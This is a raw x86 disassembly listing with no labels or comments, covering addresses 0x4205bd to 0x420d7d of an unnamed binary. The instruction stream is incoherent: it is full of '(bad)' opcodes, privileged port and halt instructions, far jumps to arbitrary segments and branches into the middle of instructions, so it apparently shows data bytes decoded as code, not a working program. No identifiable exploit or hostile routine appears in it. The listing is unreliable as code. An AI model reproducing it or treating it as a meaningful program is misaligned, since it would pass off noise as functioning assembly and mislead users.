  4205bd:	sbb    dl,dl
  4205bf:	pop    ecx
  4205c0:	cmc    
  4205c1:	dec    edx
  4205c2:	and    DWORD PTR [edx],0xe1382291
  4205c8:	ins    DWORD PTR es:[di],dx
  4205ca:	and    BYTE PTR [esi],0xee
  4205cd:	inc    esp
  4205ce:	fidivr DWORD PTR [eax+0x6b7b96ae]
  4205d4:	jne    0x42056a
  4205d6:	out    0xfd,eax
  4205d8:	add    eax,0xb711b53a
  4205dd:	or     BYTE PTR [ebp-0x4bdd77e6],ch
  4205e3:	or     dh,BYTE PTR [ebx-0x7c]
  4205e6:	(bad)  
  4205e7:	sbb    al,0x3d
  4205e9:	retf   0xbeb1
  4205ec:	dec    esp
  4205ed:	and    al,0xa6
  4205ef:	out    0xa8,al
  4205f1:	dec    ebp
  4205f2:	jae    0x4205f9
  4205f4:	sbb    edi,DWORD PTR [edi]
  4205f6:	rcr    BYTE PTR [eax+eax*2],1
  4205f9:	sbb    esp,DWORD PTR [eax-0x16]
  4205fc:	xor    BYTE PTR [edi],bh
  4205fe:	sbb    al,0x55
  420600:	in     al,dx
  420601:	(bad)  
  420602:	cwde   
  420603:	in     eax,0xbc
  420605:	ss inc edi
  420607:	cli    
  420608:	jbe    0x4205e3
  42060a:	xor    ah,BYTE PTR [ebx+0x3bd6d03]
  420610:	adc    ebx,DWORD PTR [edx]
  420612:	mov    al,0x49
  420614:	lock mov ah,0xdc
  420617:	jmp    0x912579d5
  42061c:	popa   
  42061d:	xor    esi,eax
  42061f:	jge    0x420660
  420621:	cmp    esi,DWORD PTR [edx-0x387f01e8]
  420627:	mov    dl,0x41
  420629:	dec    edx
  42062a:	fcomp  QWORD PTR [esi]
  42062c:	inc    edi
  42062d:	test   bl,0x86
  420630:	push   ebp
  420631:	fnstcw WORD PTR [eax-0x30752ff6]
  420637:	hlt    
  420638:	xchg   ecx,eax
  420639:	mov    ebp,ss
  42063b:	inc    edx
  42063c:	sub    eax,0x1858e323
  420641:	(bad)  
  420642:	xchg   ecx,eax
  420643:	int    0x66
  420645:	pusha  
  420646:	push   ebp
  420647:	jl     0x420607
  420649:	push   ebx
  42064a:	mov    ds:0xb951edf7,al
  42064f:	mov    ds:0x8557194b,eax
  420654:	push   0x74
  420656:	xchg   BYTE PTR ds:0x85206964,ah
  42065c:	cmp    dl,BYTE PTR [esi+0x4a]
  42065f:	cmc    
  420660:	mov    bl,0x2c
  420662:	and    al,0x16
  420664:	(bad)  
  420665:	mov    cl,0xe8
  420667:	jnp    0x4206df
  420669:	xchg   esi,eax
  42066a:	cmp    eax,0x8dbc9ea7
  42066f:	xchg   ebp,eax
  420670:	cli    
  420671:	out    0xf,al
  420673:	aas    
  420674:	mov    ebx,0xdb6079d9
  420679:	fnstsw WORD PTR [edx-0x7fc4fc3]
  42067f:	loopne 0x420608
  420681:	ds and al,0x2f
  420684:	popf   
  420685:	inc    edx
  420686:	aam    0xea
  420688:	sbb    esp,DWORD PTR [ebp*2-0x62eeff5b]
  42068f:	fcmovbe st,st(6)
  420691:	sbb    DWORD PTR [edi],edi
  420693:	shl    DWORD PTR [ecx-0x6e],1
  420696:	int3   
  420697:	or     DWORD PTR [ebp-0x2fdc436c],edi
  42069d:	(bad)  
  42069e:	jae    0x4206e1
  4206a0:	xchg   ebx,eax
  4206a1:	sub    DWORD PTR [eax],0x15
  4206a4:	adc    esp,DWORD PTR [ebx-0x6f3d07ce]
  4206aa:	or     bl,BYTE PTR [edx+eax*1]
  4206ad:	fs pop esi
  4206af:	cli    
  4206b0:	lods   eax,DWORD PTR ds:[esi]
  4206b1:	aaa    
  4206b2:	and    DWORD PTR [esi+0x52],0x9b5aaa70
  4206b9:	mov    WORD PTR [ebp-0x5cf9c14f],?
  4206bf:	xor    ch,BYTE PTR [edx+ecx*1+0x6cd946e3]
  4206c6:	mov    ebp,cs
  4206c8:	mov    al,ds:0x5369d18c
  4206cd:	(bad)  
  4206ce:	retf   0x3bb5
  4206d1:	and    esi,DWORD PTR [edi-0x31a2f5f2]
  4206d7:	pop    esp
  4206d8:	jge    0x4206d4
  4206da:	xor    dl,BYTE PTR [edi-0x1170c1e2]
  4206e0:	pop    edi
  4206e1:	loop   0x420702
  4206e3:	jge    0x4206db
  4206e5:	mov    ch,0x5c
  4206e7:	pop    edx
  4206e8:	pop    esp
  4206e9:	push   cs
  4206ea:	xlat   BYTE PTR es:[ebx]
  4206ec:	das    
  4206ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206ee:	xor    DWORD PTR [ebp+edi*4-0x712f53a8],esp
  4206f5:	enter  0x616c,0xa0
  4206f9:	dec    ebp
  4206fa:	lahf   
  4206fb:	pop    edx
  4206fc:	mov    eax,ebx
  4206fe:	loope  0x420752
  420700:	fadd   QWORD PTR [eax]
  420702:	pop    ebx
  420703:	aam    0x6c
  420705:	bound  ebx,QWORD PTR [esi+eiz*2+0x431025f0]
  42070c:	xor    esi,DWORD PTR [edx+0x55]
  42070f:	inc    ebp
  420710:	imul   ebx,DWORD PTR [eax],0x4c
  420713:	push   esp
  420714:	or     BYTE PTR [edx],bl
  420716:	stos   BYTE PTR es:[edi],al
  420717:	test   al,0x46
  420719:	push   esp
  42071a:	adc    eax,DWORD PTR [edx]
  42071c:	dec    ecx
  42071d:	cwde   
  42071e:	push   es
  42071f:	mov    ds:0x9d7fdd08,al
  420724:	or     eax,0xe88b68be
  420729:	jae    0x420720
  42072b:	inc    ecx
  42072c:	stos   DWORD PTR es:[edi],eax
  42072d:	cmp    edx,DWORD PTR [edi+0xe068db1]
  420733:	ins    DWORD PTR es:[edi],dx
  420734:	jle    0x4206e3
  420736:	dec    esp
  420737:	rcr    DWORD PTR [edi-0x35],1
  42073a:	in     al,dx
  42073b:	mov    BYTE PTR [edx+0x55],cl
  42073e:	dec    edx
  42073f:	sbb    BYTE PTR [esi-0x4b],bh
  420742:	nop
  420743:	or     al,0xd7
  420745:	(bad)  
  420746:	inc    esi
  420747:	fstp   st(2)
  420749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42074a:	mov    ds:0xcacdba85,eax
  42074f:	or     DWORD PTR [ecx],0x29
  420752:	xor    al,0x2e
  420754:	rcr    BYTE PTR [edx-0x3b],0x21
  420758:	or     BYTE PTR [eax],dh
  42075a:	and    edi,DWORD PTR [ecx-0x67]
  42075d:	mov    al,0x86
  42075f:	retf   0xae30
  420762:	test   DWORD PTR [esi-0x6f],esp
  420765:	or     eax,0x4c334396
  42076a:	(bad)  
  42076b:	xchg   esp,eax
  42076c:	sub    ax,0x1000
  420770:	pop    esp
  420771:	inc    ecx
  420772:	inc    esp
  420773:	repnz mov ebx,edx
  420776:	mov    bl,ch
  420778:	sub    DWORD PTR [esi+0x4e],ebx
  42077b:	stos   BYTE PTR es:[edi],al
  42077c:	int3   
  42077d:	stc    
  42077e:	mov    esp,0x2b61c8e0
  420783:	inc    edi
  420784:	mov    dl,0xe9
  420786:	std    
  420787:	ins    BYTE PTR es:[edi],dx
  420788:	jp     0x420730
  42078a:	addr16 sub ecx,esp
  42078d:	xchg   ebp,eax
  42078e:	cwde   
  42078f:	out    0xf,eax
  420791:	ss jo  0x420795
  420794:	jo     0x420812
  420796:	jo     0x420764
  420798:	idiv   edi
  42079a:	lds    esi,FWORD PTR [ebx]
  42079c:	or     al,0x6f
  42079e:	cli    
  42079f:	sub    BYTE PTR [edi],dl
  4207a1:	push   esp
  4207a2:	jge    0x420734
  4207a4:	ins    BYTE PTR es:[edi],dx
  4207a5:	lods   eax,DWORD PTR ds:[esi]
  4207a6:	lods   al,BYTE PTR ds:[esi]
  4207a7:	dec    ebx
  4207a8:	popa   
  4207a9:	cmp    eax,0xa9fb2f14
  4207ae:	outs   dx,DWORD PTR ds:[esi]
  4207af:	bswap  edx
  4207b1:	sub    DWORD PTR [ecx-0x4ad48c6d],edx
  4207b7:	push   ss
  4207b8:	lods   al,BYTE PTR ds:[esi]
  4207b9:	mov    edx,0x16356bd8
  4207be:	mov    al,0xc4
  4207c0:	and    dh,ch
  4207c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207c3:	pushf  
  4207c4:	push   eax
  4207c5:	dec    ecx
  4207c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207c7:	(bad)  
  4207c9:	test   DWORD PTR [ebx],0x553a1672
  4207cf:	inc    esi
  4207d0:	lods   eax,DWORD PTR ds:[esi]
  4207d1:	je     0x42080c
  4207d3:	mov    cl,0xd3
  4207d5:	not    eax
  4207d7:	mov    ecx,0x6ad589c
  4207dc:	or     cl,BYTE PTR [edx-0x78]
  4207df:	jne    0x420805
  4207e1:	int    0x90
  4207e3:	xor    ah,BYTE PTR [edi+0x330d70de]
  4207e9:	jns    0x420855
  4207eb:	jmp    0x420850
  4207ed:	mov    esi,0x2383dba2
  4207f2:	or     BYTE PTR [edi],0x7c
  4207f5:	sbb    bh,0xfb
  4207f8:	iret   
  4207f9:	jg     0x4207e9
  4207fb:	xchg   edx,eax
  4207fc:	cdq    
  4207fd:	sahf   
  4207fe:	xchg   ebp,eax
  4207ff:	and    al,0xbe
  420801:	inc    esi
  420802:	cmp    bh,BYTE PTR [esi+ebp*4]
  420805:	add    eax,0x1836b50c
  42080a:	bound  ecx,QWORD PTR [edx-0x34]
  42080d:	mov    ds:0xe47c47a1,al
  420812:	repnz and esp,DWORD PTR [edi+0x5eaf091f]
  420819:	mov    cl,0xe2
  42081b:	(bad)  
  42081c:	mov    bl,0xc0
  42081e:	imul   edx,DWORD PTR [edx+0x5848b613],0xf5391e16
  420828:	xor    BYTE PTR [ebx-0x1a031c9d],ch
  42082e:	xchg   ebx,eax
  42082f:	xor    DWORD PTR [edi+ecx*4],edi
  420832:	jmp    0xd5d4a3f9
  420837:	lock cld 
  420839:	aad    0x8c
  42083b:	pop    edx
  42083c:	aam    0x85
  42083e:	dec    eax
  42083f:	push   0xffffff94
  420841:	pop    edx
  420842:	test   eax,0xa15b5a0d
  420847:	push   ss
  420848:	jecxz  0x420865
  42084a:	test   DWORD PTR [esi],0xc59557f6
  420850:	mov    ds:0xb3d5fce3,al
  420855:	lods   al,BYTE PTR ds:[esi]
  420856:	(bad)  
  420857:	jbe    0x420811
  420859:	mov    ecx,0xa80f8c39
  42085e:	push   ebx
  42085f:	lea    ebx,[ebp-0x33]
  420862:	and    ebp,DWORD PTR [edi]
  420864:	popa   
  420865:	sub    BYTE PTR [esi-0x7d],al
  420868:	loopne 0x4207ee
  42086a:	xor    esp,eax
  42086c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42086d:	loop   0x420867
  42086f:	cmp    al,0x53
  420871:	inc    edi
  420872:	pusha  
  420873:	cmc    
  420874:	adc    bl,BYTE PTR [ebp+ebp*1+0x6e]
  420878:	xor    BYTE PTR [esi],ch
  42087a:	dec    ebp
  42087b:	mov    dh,0x49
  42087d:	mov    eax,0xff413a3
  420882:	cmc    
  420883:	popa   
  420884:	ins    DWORD PTR es:[edi],dx
  420885:	stos   BYTE PTR es:[edi],al
  420886:	rcl    esi,0x3b
  420889:	mov    eax,ds:0xa6bf3a0c
  42088e:	aaa    
  42088f:	push   ebp
  420890:	add    eax,0xf7c4a89a
  420895:	mov    edi,ebp
  420897:	addr16 inc esi
  420899:	or     eax,0x75435867
  42089e:	pop    eax
  42089f:	stos   DWORD PTR es:[edi],eax
  4208a0:	mov    eax,ds:0xa2823ba3
  4208a5:	into   
  4208a6:	and    dl,BYTE PTR [edi-0x5001dfc0]
  4208ac:	mov    ds:0x54d21a87,eax
  4208b1:	das    
  4208b2:	push   edi
  4208b3:	sub    dh,BYTE PTR ds:0x4e12c088
  4208b9:	lods   al,BYTE PTR ds:[esi]
  4208ba:	sbb    dl,BYTE PTR [edx+edx*1+0xa46bddf]
  4208c1:	ror    DWORD PTR [esi-0x571fbb85],1
  4208c7:	hlt    
  4208c8:	inc    esi
  4208c9:	cmp    al,al
  4208cb:	fs inc ecx
  4208cd:	push   ss
  4208ce:	call   0xde62237b
  4208d3:	pop    eax
  4208d4:	and    al,0x41
  4208d6:	out    dx,al
  4208d7:	inc    ebp
  4208d8:	out    0x10,al
  4208da:	rol    DWORD PTR gs:[esi],0xc1
  4208de:	frstor [ebx]
  4208e0:	dec    esp
  4208e1:	imul   eax,ebp,0x8e7420e4
  4208e7:	shl    BYTE PTR [eax],cl
  4208e9:	mov    ebp,0xd504b4c7
  4208ee:	lock xchg esp,eax
  4208f0:	inc    edx
  4208f1:	mov    dh,0xe1
  4208f3:	std    
  4208f4:	in     al,dx
  4208f5:	push   eax
  4208f6:	call   0x4ad3:0x43e969a3
  4208fd:	mov    bh,0xdc
  4208ff:	sbb    eax,0xa868639a
  420904:	les    edi,FWORD PTR [eax+ecx*4-0x57]
  420908:	cli    
  420909:	fs loopne 0x4208fb
  42090c:	call   ecx
  42090e:	and    DWORD PTR [ebx+0x66b43dcd],0x111d84cc
  420918:	into   
  420919:	ja     0x4208b4
  42091b:	push   ebx
  42091c:	fst    QWORD PTR [edx-0x16dbc4fb]
  420922:	adc    BYTE PTR [ebp+0x1],dh
  420925:	cwde   
  420926:	fs nop
  420928:	push   esp
  420929:	xor    DWORD PTR [ebx+0x2524da6c],ebp
  42092f:	jmp    0x896b4691
  420934:	dec    esi
  420935:	mov    dl,0x57
  420937:	or     eax,0x3948b324
  42093c:	data16 aaa 
  42093e:	add    al,0x5f
  420940:	(bad)  
  420941:	and    eax,0x867433e8
  420946:	mov    dh,bh
  420948:	pop    es
  420949:	pop    eax
  42094a:	pop    esp
  42094b:	mov    ebx,0x8e9d1f15
  420950:	and    eax,0x90de5c4e
  420955:	xchg   esi,eax
  420956:	fwait
  420957:	mov    ebp,0xff57ff4f
  42095c:	clc    
  42095d:	or     eax,0x5bbb6c0f
  420962:	mov    bh,0x7
  420964:	add    DWORD PTR es:[edi-0x37706e10],edi
  42096b:	dec    BYTE PTR [ebp+0x4113af5b]
  420971:	inc    esp
  420972:	inc    edx
  420973:	leave  
  420974:	push   ss
  420975:	or     BYTE PTR [eax+0x23],al
  420978:	push   0x59
  42097a:	sar    BYTE PTR [edx],0x8f
  42097d:	test   BYTE PTR [esi+ebx*8+0x16],0x8f
  420982:	sbb    eax,0x3e3fd876
  420987:	ror    BYTE PTR [edx-0x739f056e],0xab
  42098e:	and    ecx,ebx
  420990:	adc    BYTE PTR [ecx+0x58],cl
  420993:	stos   BYTE PTR es:[edi],al
  420994:	mov    esi,0x5c773b4a
  420999:	fdivr  QWORD PTR ds:0x2e6f97cf
  42099f:	cmp    BYTE PTR [ebp+0x25],dh
  4209a2:	jno    0x420993
  4209a4:	(bad)  
  4209a5:	or     cl,BYTE PTR [ecx+edx*1+0x5d]
  4209a9:	int3   
  4209aa:	xchg   ecx,eax
  4209ab:	fist   WORD PTR [ebx]
  4209ad:	dec    ebp
  4209ae:	dec    esp
  4209af:	mov    ebp,0x21444ab3
  4209b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209b5:	pusha  
  4209b6:	nop
  4209b7:	cmp    eax,0x98354eff
  4209bc:	gs push ecx
  4209be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209bf:	ss inc bx
  4209c2:	loope  0x420952
  4209c4:	ror    cl,0xde
  4209c7:	call   0xc2f05462
  4209cc:	sar    DWORD PTR [eax-0x34163131],1
  4209d2:	sahf   
  4209d3:	sbb    eax,DWORD PTR [esi-0xc]
  4209d6:	dec    ebx
  4209d7:	out    0xea,al
  4209d9:	jle    0x42096c
  4209db:	in     al,0x90
  4209dd:	xor    eax,DWORD PTR [edi]
  4209df:	pop    ecx
  4209e0:	ss imul ebp,esp,0x3720f7bc
  4209e7:	or     DWORD PTR [ecx+ebx*1-0x299b44cb],esi
  4209ee:	pop    ebx
  4209ef:	push   ecx
  4209f0:	adc    eax,0xa1fce12c
  4209f5:	xchg   ecx,eax
  4209f6:	adc    esp,DWORD PTR [ecx-0x73766905]
  4209fc:	dec    ebx
  4209fd:	pop    eax
  4209fe:	fcom   QWORD PTR [edi]
  420a00:	lods   al,BYTE PTR ds:[esi]
  420a01:	mov    esi,0x8bf06334
  420a06:	jl     0x4209bb
  420a08:	and    eax,0xdf9891d8
  420a0d:	pop    edi
  420a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a0f:	jno    0x4209ee
  420a11:	jno    0x420a1b
  420a13:	les    esp,FWORD PTR [ebx]
  420a15:	xchg   esp,eax
  420a16:	aaa    
  420a17:	push   ecx
  420a18:	stc    
  420a19:	jnp    0x4209e6
  420a1b:	fs dec eax
  420a1d:	or     eax,0xc76406f3
  420a22:	adc    cl,BYTE PTR [si+0x44]
  420a26:	call   0x3de8:0x28b5292a
  420a2d:	sbb    dh,BYTE PTR [ebp-0x7ef2cd5b]
  420a33:	xchg   esp,eax
  420a34:	out    0xc0,al
  420a36:	ret    0x85a1
  420a39:	inc    eax
  420a3a:	enter  0xd442,0xd0
  420a3e:	push   esp
  420a3f:	jnp    0x420a01
  420a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a42:	and    DWORD PTR [eax-0x3d],edx
  420a45:	or     DWORD PTR [edx-0x5e],eax
  420a48:	cmp    al,0xe7
  420a4a:	int    0x9c
  420a4c:	jae    0x4209fd
  420a4e:	sbb    BYTE PTR [ebx-0x1c],0x5c
  420a52:	imul   DWORD PTR [edi+0x69cc029e]
  420a58:	arpl   WORD PTR [ebx],cx
  420a5a:	jmp    0x420a29
  420a5c:	mov    ds:0x46051c99,al
  420a61:	xchg   esp,eax
  420a62:	aaa    
  420a63:	add    eax,DWORD PTR [ecx+0x4c0119d4]
  420a69:	jb     0x420a33
  420a6b:	or     edi,ebp
  420a6d:	sbb    ebp,DWORD PTR [edx+0x2202555b]
  420a73:	sbb    eax,0x535ff189
  420a78:	daa    
  420a79:	mov    ds:0x7f3fe7fa,eax
  420a7e:	icebp  
  420a7f:	add    al,0xa5
  420a81:	push   esp
  420a82:	dec    esp
  420a83:	xchg   esp,eax
  420a84:	inc    ebx
  420a85:	mov    ebp,0xb2991de5
  420a8a:	loopne 0x420ad0
  420a8c:	jmp    0x2aa3:0x1bb32e58
  420a93:	arpl   WORD PTR [esi+esi*4+0x52],bp
  420a97:	out    0xf2,al
  420a99:	sahf   
  420a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a9b:	jmp    0xe92c:0x5cb018d7
  420aa2:	sti    
  420aa3:	sahf   
  420aa4:	stos   BYTE PTR es:[edi],al
  420aa5:	mov    al,0x1e
  420aa7:	(bad)  
  420aa8:	hlt    
  420aa9:	or     edx,DWORD PTR [edi-0x49]
  420aac:	mov    ah,BYTE PTR ds:0x2e92de2a
  420ab2:	sub    DWORD PTR [edx],ebp
  420ab4:	xor    DWORD PTR [ecx],ebp
  420ab6:	and    al,0x6c
  420ab8:	sbb    edx,edx
  420aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420abb:	xor    dl,dh
  420abd:	adc    DWORD PTR [ecx-0x60f11bdd],ebp
  420ac3:	sbb    BYTE PTR [eax+esi*1-0x7842827c],0x9c
  420acb:	pop    esp
  420acc:	leave  
  420acd:	mov    al,0x7f
  420acf:	cld    
  420ad0:	cmp    eax,0xa83eefc0
  420ad5:	std    
  420ad6:	mov    dh,0xdb
  420ad8:	sub    edx,DWORD PTR [eax]
  420ada:	add    bh,ch
  420adc:	or     al,0xba
  420ade:	fnstcw WORD PTR [edi+edx*4+0x6d]
  420ae2:	cmp    DWORD PTR [eax],eax
  420ae4:	xor    ebx,DWORD PTR [ebp-0x61b340de]
  420aea:	push   edi
  420aeb:	daa    
  420aec:	mov    eax,0x9217f5b6
  420af1:	sub    esi,edi
  420af3:	mov    ?,edi
  420af5:	and    esp,0x17569024
  420afb:	mov    edi,0x4a412903
  420b00:	sbb    eax,0xdfbde119
  420b05:	test   BYTE PTR [esi],0x7e
  420b08:	in     eax,dx
  420b09:	movd   DWORD PTR [edi],mm0
  420b0c:	lods   eax,DWORD PTR ds:[esi]
  420b0d:	inc    edx
  420b0e:	xchg   edi,eax
  420b0f:	add    eax,0x93ac6dad
  420b14:	into   
  420b15:	cmp    al,0x41
  420b17:	lods   eax,DWORD PTR ds:[esi]
  420b18:	xor    ebx,DWORD PTR [edx]
  420b1a:	mov    al,0x96
  420b1c:	or     eax,esi
  420b1e:	push   es
  420b1f:	(bad)  
  420b20:	sbb    cl,BYTE PTR [ebp-0x53a079d3]
  420b26:	adc    DWORD PTR [ebp+0x34],ebp
  420b29:	xchg   ch,ah
  420b2b:	xlat   BYTE PTR ds:[ebx]
  420b2c:	adc    DWORD PTR [ebp+ecx*1+0x29dc3696],ecx
  420b33:	ja     0x420b6e
  420b35:	jns    0x420ba1
  420b37:	mov    WORD PTR [ecx+0x8238456],ss
  420b3d:	repnz scas al,BYTE PTR es:[edi]
  420b3f:	adc    BYTE PTR [esi],0xc3
  420b42:	inc    esi
  420b43:	xchg   DWORD PTR [ebp-0x26],edi
  420b46:	cs in  al,dx
  420b48:	js     0x420b17
  420b4a:	mov    cl,0x3a
  420b4c:	sbb    DWORD PTR [edi],esi
  420b4e:	shr    ebx,0x12
  420b51:	cmp    DWORD PTR [edi+0x25],edi
  420b54:	mov    ds:0x6290a072,al
  420b59:	xor    eax,DWORD PTR [edx]
  420b5b:	test   al,0x4c
  420b5d:	in     al,0x9e
  420b5f:	test   DWORD PTR [eax+0x68],ebx
  420b62:	ins    BYTE PTR es:[edi],dx
  420b63:	adc    BYTE PTR [esi],bh
  420b65:	rol    BYTE PTR [ebx+0x39b1df12],cl
  420b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b6c:	sti    
  420b6d:	push   eax
  420b6e:	inc    esi
  420b6f:	hlt    
  420b70:	stc    
  420b71:	pop    ebx
  420b72:	mov    esp,0x96b1415e
  420b77:	mov    dl,BYTE PTR [ebx+ebx*4+0x3b]
  420b7b:	adc    DWORD PTR [ebx+0x75184b51],ebp
  420b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b82:	push   cs
  420b83:	mov    ds:0xc51c4756,eax
  420b88:	cmp    DWORD PTR [ebp+0x3be9d575],eax
  420b8e:	mov    WORD PTR [ecx-0x30555fe],es
  420b94:	xor    DWORD PTR [ecx-0x64aead3a],0x68a4c45
  420b9e:	pop    ss
  420b9f:	adc    BYTE PTR [edx+0x23],ah
  420ba2:	xor    esi,DWORD PTR [edx-0x35]
  420ba5:	shr    DWORD PTR [ebx-0x2d],cl
  420ba8:	adc    esi,DWORD PTR [edx+ebx*1+0x3a0d4ea1]
  420baf:	adc    ebx,DWORD PTR [ecx]
  420bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bb2:	xchg   ecx,eax
  420bb3:	clc    
  420bb4:	test   DWORD PTR [eax+ebx*2+0x368301bc],ecx
  420bbb:	push   ebp
  420bbc:	push   0x3f662f4e
  420bc1:	ror    BYTE PTR [edx],1
  420bc3:	or     ebp,DWORD PTR [esi]
  420bc5:	cs (bad) 
  420bc7:	retf   
  420bc8:	inc    ecx
  420bc9:	dec    esp
  420bca:	xchg   edi,eax
  420bcb:	aad    0x34
  420bcd:	les    esp,FWORD PTR [edx+edx*1-0x7]
  420bd1:	add    al,0x2a
  420bd3:	nop
  420bd4:	sbb    DWORD PTR [esi],edx
  420bd6:	dec    esp
  420bd7:	jmp    0x7f013df7
  420bdc:	inc    ebx
  420bdd:	sbb    eax,0xe24dc2dd
  420be2:	cli    
  420be3:	mov    esi,DWORD PTR [edi]
  420be5:	call   0x5dd1a581
  420bea:	sti    
  420beb:	adc    eax,0xbd2dd75e
  420bf0:	out    0x2f,al
  420bf2:	jnp    0x420be0
  420bf4:	enter  0x3a09,0x16
  420bf8:	push   esp
  420bf9:	push   ebx
  420bfa:	mov    dl,BYTE PTR [edx+ebx*2]
  420bfd:	pop    edi
  420bfe:	dec    ecx
  420bff:	test   eax,0x245ee4e3
  420c04:	sbb    edi,DWORD PTR [ebx]
  420c06:	mov    ecx,DWORD PTR [esi-0x5db69d1b]
  420c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c0d:	push   esp
  420c0e:	(bad)  
  420c0f:	fisub  WORD PTR [edx]
  420c11:	xor    ch,BYTE PTR ds:0xbd94b50e
  420c17:	cmp    dl,BYTE PTR [ecx*8+0x63cd1273]
  420c1e:	sub    dl,BYTE PTR ds:0xe2852b1d
  420c24:	inc    ecx
  420c25:	push   ebp
  420c26:	push   ss
  420c27:	cwde   
  420c28:	dec    edx
  420c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c2a:	mov    al,ds:0x9374bb19
  420c2f:	pop    edx
  420c30:	retf   
  420c31:	fistp  DWORD PTR [esi]
  420c33:	fdiv   QWORD PTR [esi-0x19]
  420c36:	fild   DWORD PTR [ebx]
  420c38:	cmp    DWORD PTR [eax],eax
  420c3a:	push   edi
  420c3b:	add    BYTE PTR [esi+0x42],bh
  420c3e:	dec    edx
  420c3f:	test   eax,0x4f2123df
  420c44:	xchg   ebp,eax
  420c45:	sbb    BYTE PTR [ebx-0x554362ce],bh
  420c4b:	popa   
  420c4c:	sbb    al,0xad
  420c4e:	fld    st(7)
  420c50:	fld    QWORD PTR [eax-0x16]
  420c53:	cmp    al,0xda
  420c55:	dec    ebx
  420c56:	push   edi
  420c57:	sbb    esi,eax
  420c59:	dec    ebp
  420c5a:	push   esp
  420c5b:	or     DWORD PTR [eax+eax*2-0x5a50aeae],ebx
  420c62:	das    
  420c63:	jl     0x420c0b
  420c65:	retf   0x3f4f
  420c68:	cld    
  420c69:	dec    esi
  420c6a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c6d:	iret   
  420c6e:	jae    0x420c6c
  420c70:	mov    edi,0xd012e43e
  420c75:	add    al,0xa5
  420c77:	xchg   esp,eax
  420c78:	imul   esi,DWORD PTR [esi+edx*8+0x27317224],0xb2722cea
  420c83:	out    0x1c,al
  420c85:	sar    BYTE PTR [eax+0x554b9b1f],1
  420c8b:	and    eax,0xa7299ca2
  420c90:	xchg   edi,eax
  420c91:	pop    ebp
  420c92:	mov    dl,bl
  420c94:	or     dl,BYTE PTR [ebp-0x2e5a6470]
  420c9a:	push   ebp
  420c9b:	imul   eax,DWORD PTR [eax+esi*1+0xc],0xffffff82
  420ca0:	das    
  420ca1:	aad    0xb9
  420ca3:	cmp    eax,0x60d54b9
  420ca8:	cdq    
  420ca9:	mov    DWORD PTR [eax-0x6d],edx
  420cac:	jmp    0xd80f:0x541b54c6
  420cb3:	scas   al,BYTE PTR es:[edi]
  420cb4:	icebp  
  420cb5:	mov    esp,0xf9bfa0d2
  420cba:	repz xor eax,0x1a569294
  420cc0:	jl     0x420cd1
  420cc2:	push   edx
  420cc3:	das    
  420cc4:	pushf  
  420cc5:	inc    ecx
  420cc6:	push   ebp
  420cc7:	lahf   
  420cc8:	imul   ebp,DWORD PTR [eax-0x2b],0x1d
  420ccc:	retf   0x9f18
  420ccf:	fbld   TBYTE PTR [esi]
  420cd1:	push   edx
  420cd2:	jno    0x420cff
  420cd4:	fbstp  TBYTE PTR [edi]
  420cd6:	scas   eax,DWORD PTR es:[edi]
  420cd7:	mov    edx,0x37a31d4
  420cdc:	jmp    0x4684:0xbccc2bcc
  420ce3:	cli    
  420ce4:	push   eax
  420ce5:	sbb    DWORD PTR [ebx+0x7cd4504a],esp
  420ceb:	call   0x85f0:0xdd17a870
  420cf2:	and    DWORD PTR [ecx+eax*2],ebx
  420cf5:	sub    esi,eax
  420cf7:	push   eax
  420cf8:	xchg   esp,eax
  420cf9:	mov    eax,ds:0x2971bb7a
  420cfe:	out    dx,al
  420cff:	add    al,0x75
  420d01:	xor    al,0x54
  420d03:	sar    DWORD PTR [esp+ebp*8-0x1d],cl
  420d07:	pushf  
  420d08:	pop    ss
  420d09:	cmc    
  420d0a:	fdivr  QWORD PTR [ebp-0x66]
  420d0d:	test   dl,dl
  420d0f:	or     al,cl
  420d11:	jo     0x420cc9
  420d13:	xchg   ebx,eax
  420d14:	int    0x36
  420d16:	jb     0x420cc6
  420d18:	cmp    DWORD PTR [esi+0x69fb8450],eax
  420d1e:	xchg   ebx,eax
  420d1f:	leave  
  420d20:	inc    eax
  420d21:	daa    
  420d22:	fisttp DWORD PTR [esi+0x7a26a3a6]
  420d28:	xor    bl,BYTE PTR [ebx-0x2cfe75e3]
  420d2e:	and    bh,cl
  420d30:	ins    DWORD PTR es:[edi],dx
  420d31:	mov    ah,0x13
  420d33:	xchg   BYTE PTR ds:0x3041f44a,ch
  420d39:	and    DWORD PTR [ebx-0xacba96a],ecx
  420d3f:	pop    edi
  420d40:	repz push ebp
  420d42:	in     eax,dx
  420d43:	mov    ecx,0x431ad5ab
  420d48:	stc    
  420d49:	sahf   
  420d4a:	mov    edi,0xe4655f9
  420d4f:	cmp    DWORD PTR [edi+0x3e4fa3a],ebx
  420d55:	push   0xffffffb5
  420d57:	sub    BYTE PTR [ebx-0x42b9329f],ch
  420d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d5e:	pop    edi
  420d5f:	adc    cl,BYTE PTR [eax-0x4af53ad8]
  420d65:	outs   dx,BYTE PTR ds:[esi]
  420d66:	pop    eax
  420d67:	jmp    0x420cf1
  420d69:	in     al,0xcc
  420d6b:	out    dx,al
  420d6c:	jb     0x420cf7
  420d6e:	pop    eax
  420d6f:	dec    esp
  420d70:	ret    
  420d71:	sub    dl,ch
  420d73:	xchg   edx,esp
  420d75:	or     ch,BYTE PTR [edx+edi*4]
  420d78:	add    eax,0xa3e8ba49
  420d7d:	cwde   
